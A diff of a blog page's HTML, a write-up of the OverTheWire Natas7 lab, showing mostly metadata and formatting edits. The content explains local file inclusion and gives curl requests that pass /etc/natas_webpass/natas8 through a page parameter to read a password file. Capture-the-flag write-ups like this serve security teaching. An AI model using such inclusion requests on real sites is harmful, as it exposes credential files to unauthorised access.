@@ -7,12 +7,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Maksymilian Więckowski ">
 <meta name="description" content="The starting point is as usual:
-URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&amp;rsquo;ll need to do. I have 2 Home html tags and a About.
+URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&amp;rsquo;ll need to do. I have 2 &amp;lt;a href=&amp;quot;index.php?page=home&amp;quot;&amp;gt;Home&amp;lt;/a&amp;gt; html tags and a &amp;lt;a href=&amp;quot;index.php?page=about&amp;quot;&amp;gt;About&amp;lt;/a&amp;gt;.
 What it means that we can traverse the website via this index.php?page=xyz
 We also get a hint:
 &amp;lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&amp;gt; I check my theory:
 curl --user natas7:$(cat natas7 ) $URL&amp;#34;/index.php?page=/etc/&amp;#34; And I get this:" />
-<meta name="keywords" content=", Over the wire, Natas, Curl, Linux, Web Security" />
+<meta name="keywords" content="python, programming, blog, overthewire, django, fastapi, linux, security, Over the wire, Natas, Curl, Linux, Web Security" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="http://localhost:1313/posts/natas7/" />
@@ -20,7 +20,7 @@ curl --user natas7:$(cat natas7 ) $URL&amp;#34;/index.php?page=/etc/&amp;#34; An
 
     <title>
         
-            Over the wire - Natas7 :: Maksymilian Więckowski 
+            Over the wire - Natas7 :: Maksymilian Więckowski - blog 
         
     </title>
 
@@ -45,17 +45,18 @@ curl --user natas7:$(cat natas7 ) $URL&amp;#34;/index.php?page=/etc/&amp;#34; An
 
 <meta itemprop="name" content="Over the wire - Natas7">
 <meta itemprop="description" content="The starting point is as usual:
-URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&rsquo;ll need to do. I have 2 Home html tags and a About.
+URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&rsquo;ll need to do. I have 2 &lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt; html tags and a &lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;.
 What it means that we can traverse the website via this index.php?page=xyz
 We also get a hint:
 &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt; I check my theory:
 curl --user natas7:$(cat natas7 ) $URL&#34;/index.php?page=/etc/&#34; And I get this:"><meta itemprop="datePublished" content="2026-03-08T21:37:03+00:00" />
 <meta itemprop="dateModified" content="2026-03-08T21:37:03+00:00" />
-<meta itemprop="wordCount" content="161">
+<meta itemprop="wordCount" content="163"><meta itemprop="image" content="http://localhost:1313/" />
 <meta itemprop="keywords" content="Over the wire,Natas,Curl,Linux,Web Security," />
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Over the wire - Natas7"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Over the wire - Natas7"/>
 <meta name="twitter:description" content="The starting point is as usual:
-URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&rsquo;ll need to do. I have 2 Home html tags and a About.
+URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&rsquo;ll need to do. I have 2 &lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt; html tags and a &lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;.
 What it means that we can traverse the website via this index.php?page=xyz
 We also get a hint:
 &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt; I check my theory:
@@ -65,13 +66,13 @@ curl --user natas7:$(cat natas7 ) $URL&#34;/index.php?page=/etc/&#34; And I get 
 
     <meta property="og:title" content="Over the wire - Natas7" />
 <meta property="og:description" content="The starting point is as usual:
-URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&rsquo;ll need to do. I have 2 Home html tags and a About.
+URL=http://natas7.natas.labs.overthewire.org curl --user natas7:$(cat natas7 ) $URL I immediately know what i&rsquo;ll need to do. I have 2 &lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt; html tags and a &lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;.
 What it means that we can traverse the website via this index.php?page=xyz
 We also get a hint:
 &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt; I check my theory:
 curl --user natas7:$(cat natas7 ) $URL&#34;/index.php?page=/etc/&#34; And I get this:" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/natas7/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://localhost:1313/posts/natas7/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2026-03-08T21:37:03+00:00" />
 <meta property="article:modified_time" content="2026-03-08T21:37:03+00:00" />
 
@@ -172,7 +173,7 @@ curl --user natas7:$(cat natas7 ) $URL&#34;/index.php?page=/etc/&#34; And I get 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>curl --user  natas7:<span style="color:#66d9ef">$(</span>cat natas7 <span style="color:#66d9ef">)</span> $URL
 </span></span></code></pre></div><p>I immediately know what i&rsquo;ll need to do.
-I have 2 <strong><!-- raw HTML omitted -->Home<!-- raw HTML omitted --></strong> html tags and a <strong><!-- raw HTML omitted -->About<!-- raw HTML omitted --></strong>.</p>
+I have 2 <code>&lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt;</code> html tags and a <code>&lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;</code>.</p>
 <p>What it means that we can traverse the website via this <strong>index.php?page=xyz</strong></p>
 <p>We also get a hint:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
@@ -185,7 +186,7 @@ I have 2 <strong><!-- raw HTML omitted -->Home<!-- raw HTML omitted --></strong>
 </span></span></code></pre></div><p>Whenever you see something extraordinary/weird, you just gotta follow the lead.</p>
 <p>In this case, its <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">Local file inclusion</a>. A file is passed to index.php, that means if the user input is not properly validated/ sanatized, it can be used to access unintended files.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --user  natas7:<span style="color:#66d9ef">$(</span>cat natas7 <span style="color:#66d9ef">)</span> $URL<span style="color:#e6db74">&#34;/index.php?page=/etc/natas_webpass/natas8&#34;</span>
-</span></span></code></pre></div><p>I get the password and on to the next challange.</p>
+</span></span></code></pre></div><p>I get the password and on to the next challenge.</p>
 
         </div>
       </article>
@@ -215,7 +216,7 @@ I have 2 <strong><!-- raw HTML omitted -->Home<!-- raw HTML omitted --></strong>
             <line x1="16" y1="17" x2="8" y2="17"></line>
             <polyline points="10 9 9 9 8 9"></polyline>
           </svg>
-          161 Words
+          163 Words
         </p>
 
         <p>
